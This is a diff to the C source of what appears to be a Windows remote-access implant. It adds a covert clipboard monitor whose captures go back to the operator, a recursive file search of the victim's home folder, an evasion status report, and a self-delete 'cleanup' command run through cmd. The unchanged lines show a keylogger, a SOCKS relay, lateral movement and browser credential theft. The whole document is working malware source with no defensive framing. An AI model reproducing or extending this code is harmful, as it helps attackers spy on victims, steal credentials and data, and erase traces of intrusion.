@@ -488,6 +488,110 @@ static DWORD WINAPI KeylogThread(LPVOID p) {
     return 0;
 }
 
+// ── Clipboard monitor globals + thread ───────────────────────────────────────
+
+static char         g_clip_buf[65536];
+static int          g_clip_len    = 0;
+static HANDLE       g_clip_thread = NULL;
+static volatile int g_clip_stop   = 1;
+static int          g_clip_interval = 5; /* seconds */
+
+static DWORD WINAPI ClipMonThread(LPVOID p) {
+    (void)p;
+    g_clip_stop = 0;
+    char last[4096] = {0};
+    while (!g_clip_stop) {
+        if (OpenClipboard(NULL)) {
+            HANDLE hData = GetClipboardData(CF_TEXT);
+            if (hData) {
+                const char *text = (const char*)GlobalLock(hData);
+                if (text && strcmp(text, last) != 0) {
+                    /* new clipboard content */
+                    char entry[512];
+                    int n = snprintf(entry, sizeof(entry), "[clip] %.*s\n", 400, text);
+                    if (g_clip_len + n < (int)sizeof(g_clip_buf) - 1) {
+                        memcpy(g_clip_buf + g_clip_len, entry, n);
+                        g_clip_len += n;
+                        g_clip_buf[g_clip_len] = '\0';
+                    }
+                    strncpy(last, text, sizeof(last)-1);
+                }
+                GlobalUnlock(hData);
+            }
+            CloseClipboard();
+        }
+        for (int i = 0; i < g_clip_interval * 10 && !g_clip_stop; i++)
+            Sleep(100);
+    }
+    g_clip_stop = 1;
+    return 0;
+}
+
+// ── File search ───────────────────────────────────────────────────────────────
+
+static int g_search_count = 0;
+static char g_search_results[65536];
+static int  g_search_rlen = 0;
+
+static void search_dir(const char *dir, const char *pattern, int max_results) {
+    if (g_search_count >= max_results) return;
+    char search_path[MAX_PATH];
+    snprintf(search_path, sizeof(search_path), "%s\\*", dir);
+    WIN32_FIND_DATAA fd;
+    HANDLE hFind = FindFirstFileA(search_path, &fd);
+    if (hFind == INVALID_HANDLE_VALUE) return;
+    do {
+        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;
+        char full[MAX_PATH];
+        snprintf(full, sizeof(full), "%s\\%s", dir, fd.cFileName);
+        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+            search_dir(full, pattern, max_results);
+        } else {
+            /* simple glob: if pattern has no path sep, match just the filename */
+            int match = 0;
+            if (strchr(pattern, '*') || strchr(pattern, '?')) {
+                /* use PathMatchSpecA if available, else substring check */
+                HMODULE sh = GetModuleHandleA("shlwapi.dll");
+                if (!sh) sh = LoadLibraryA("shlwapi.dll");
+                if (sh) {
+                    typedef BOOL (WINAPI *pfnPMS)(LPCSTR, LPCSTR);
+                    pfnPMS fn = (pfnPMS)GetProcAddress(sh, "PathMatchSpecA");
+                    if (fn) match = fn(fd.cFileName, pattern);
+                }
+                if (!match) {
+                    /* fallback: simple case-insensitive strstr */
+                    char lc_name[MAX_PATH], lc_pat[MAX_PATH];
+                    strncpy(lc_name, fd.cFileName, sizeof(lc_name)-1);
+                    strncpy(lc_pat, pattern, sizeof(lc_pat)-1);
+                    for (char *q=lc_name;*q;q++) *q=(char)tolower((unsigned char)*q);
+                    for (char *q=lc_pat;*q;q++) *q=(char)tolower((unsigned char)*q);
+                    /* strip leading * for substring match */
+                    const char *pat2 = lc_pat;
+                    while (*pat2 == '*') pat2++;
+                    const char *p2 = pat2;
+                    while (*p2 == '*' || *p2 == '?') p2++;
+                    if (*p2 == '\0') match = 1; /* all wildcards — match everything */
+                    else match = (strstr(lc_name, pat2) != NULL);
+                }
+            } else {
+                /* exact match */
+                match = (_stricmp(fd.cFileName, pattern) == 0);
+            }
+            if (match && g_search_count < max_results) {
+                int n = (int)strlen(full);
+                if (g_search_rlen + n + 2 < (int)sizeof(g_search_results)) {
+                    memcpy(g_search_results + g_search_rlen, full, n);
+                    g_search_rlen += n;
+                    g_search_results[g_search_rlen++] = '\n';
+                    g_search_results[g_search_rlen]   = '\0';
+                }
+                g_search_count++;
+            }
+        }
+    } while (FindNextFileA(hFind, &fd) && g_search_count < max_results);
+    FindClose(hFind);
+}
+
 // ── SOCKS5 globals + relay + listener ────────────────────────────────────────
 
 static SOCKET       g_socks_listen = INVALID_SOCKET;
@@ -2080,6 +2184,79 @@ void dispatch_task(AgentTask *task) {
             char e2[128]; snprintf(e2,sizeof(e2),"unknown lateral method: %s",lat_method);
             agent_send_result(task->id,"",e2);
         }
+    }
+    else if (strcmp(type_upper, "CLIP_MONITOR_START") == 0) {
+        if (!g_clip_stop) { agent_send_result(task->id,"","clipboard monitor already running"); return; }
+        g_clip_len = 0; g_clip_buf[0] = '\0';
+        int iv = json_get_int(args,"interval",5);
+        g_clip_interval = (iv > 0 ? iv : 5);
+        g_clip_thread = CreateThread(NULL,0,ClipMonThread,NULL,0,NULL);
+        agent_send_result(task->id,g_clip_thread?"[+] clipboard monitor started":"","");
+    }
+    else if (strcmp(type_upper, "CLIP_MONITOR_DUMP") == 0) {
+        agent_send_result(task->id, g_clip_len ? g_clip_buf : "[no clipboard data]", "");
+        g_clip_len = 0; g_clip_buf[0] = '\0';
+    }
+    else if (strcmp(type_upper, "CLIP_MONITOR_STOP") == 0) {
+        g_clip_stop = 1;
+        if (g_clip_thread) { WaitForSingleObject(g_clip_thread,3000); CloseHandle(g_clip_thread); g_clip_thread=NULL; }
+        agent_send_result(task->id,"[+] clipboard monitor stopped","");
+    }
+    else if (strcmp(type_upper, "SEARCH") == 0) {
+        /* args: "[root] pattern" or JSON {"root":"...","pattern":"..."} */
+        char root[MAX_PATH] = {0}, pattern[256] = {0};
+        if (args && args[0] == '{') {
+            json_get_str(args,"root",root,sizeof(root),"");
+            json_get_str(args,"pattern",pattern,sizeof(pattern),"");
+        } else if (args && args[0]) {
+            /* space-separated: optional_root pattern */
+            char tmp[MAX_PATH+256]; strncpy(tmp,args,sizeof(tmp)-1);
+            char *sp = strchr(tmp,' ');
+            if (sp) { *sp='\0'; strncpy(root,tmp,sizeof(root)-1); strncpy(pattern,sp+1,sizeof(pattern)-1); }
+            else     { strncpy(pattern,tmp,sizeof(pattern)-1); }
+        }
+        if (!pattern[0]) { agent_send_result(task->id,"","usage: search [root] <pattern>"); return; }
+        if (!root[0]) { /* default: user's home + common paths */
+            const char *ud = getenv("USERPROFILE");
+            if (ud) strncpy(root,ud,sizeof(root)-1); else strncpy(root,"C:\\",3);
+        }
+        g_search_count = 0; g_search_rlen = 0; g_search_results[0] = '\0';
+        search_dir(root, pattern, 2000);
+        if (g_search_count == 0)
+            agent_send_result(task->id,"no files found","");
+        else {
+            char hdr[128]; snprintf(hdr,sizeof(hdr),"[%d files]\n",g_search_count);
+            char *out2 = malloc(strlen(hdr)+g_search_rlen+1);
+            if (out2) { strcpy(out2,hdr); strcat(out2,g_search_results); agent_send_result(task->id,out2,""); free(out2); }
+            else agent_send_result(task->id,g_search_results,"");
+        }
+    }
+    else if (strcmp(type_upper, "EVASION_STATUS") == 0) {
+        char status[512];
+        int sl = g_sleep_sec;
+        int jt = g_jitter_pct;
+        snprintf(status, sizeof(status),
+            "sleep_sec=%d jitter_pct=%d keylog=%s screenwatch=%s socks=%s clip_monitor=%s",
+            sl, jt,
+            g_keylog_stop  ? "off" : "on",
+            g_sw_stop ? "off" : "on",
+            g_socks_stop   ? "off" : "on",
+            g_clip_stop    ? "off" : "on");
+        agent_send_result(task->id, status, "");
+    }
+    else if (strcmp(type_upper, "CLEANUP") == 0) {
+        char self[MAX_PATH] = {0};
+        GetModuleFileNameA(NULL, self, sizeof(self)-1);
+        char cmd[MAX_PATH+64];
+        snprintf(cmd, sizeof(cmd),
+            "cmd /c ping -n 3 127.0.0.1 > nul & del /f /q \"%s\"", self);
+        STARTUPINFOA si = {0}; PROCESS_INFORMATION pi = {0};
+        si.cb = sizeof(si);
+        CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
+                       CREATE_NO_WINDOW|DETACHED_PROCESS, NULL, NULL, &si, &pi);
+        if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
+        agent_send_result(task->id, "[+] scheduled self-delete; exiting", "");
+        ExitProcess(0);
     }
     else if (strcmp(type_upper, "BROWSER_CREDS") == 0) {
         char *out = do_browser_creds();
